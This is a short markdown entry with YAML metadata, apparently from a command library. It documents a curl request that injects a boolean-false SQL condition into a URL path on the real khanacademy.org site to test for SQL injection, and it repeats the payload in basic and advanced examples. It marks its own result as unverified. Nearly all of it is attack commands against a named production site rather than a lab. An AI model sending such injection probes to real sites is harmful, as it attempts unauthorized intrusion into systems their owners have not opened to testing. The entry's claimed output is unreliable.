---
data: >-
  curl -s
  "https://www.khanacademy.org/translations/videos/en'%20AND'1'=='0_youtube_stats.csv"
tags:
  - sqli
  - verify
  - web
type: command
output: Limited to English CSV data
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: fdacf212-81a1-468c-804a-de96487d6bb8
created_at: '2025-12-14T03:46:20.256Z'
updated_at: '2025-12-14T03:46:20.256Z'
verified: false
validated: true
submitted: true
---
# curl-boolean-false-sqli

## Command

```bash
curl -s "https://www.khanacademy.org/translations/videos/en'%20AND'1'=='0_youtube_stats.csv"
```

## Description

Verifies SQLi by injecting a false condition to control query results.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| URL | Endpoint with false payload | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://www.khanacademy.org/translations/videos/en'%20AND'1'=='0_youtube_stats.csv"
```

### Advanced Usage

```bash
curl -s "https://www.khanacademy.org/translations/videos/en'%20AND'1'=='0_youtube_stats.csv" > english_only.csv
```

## Expected Output

Filtered response with only matching (English) records.

## Related

- [[Related Procedure: Verify-SQL-Injection-with-Boolean-False]]
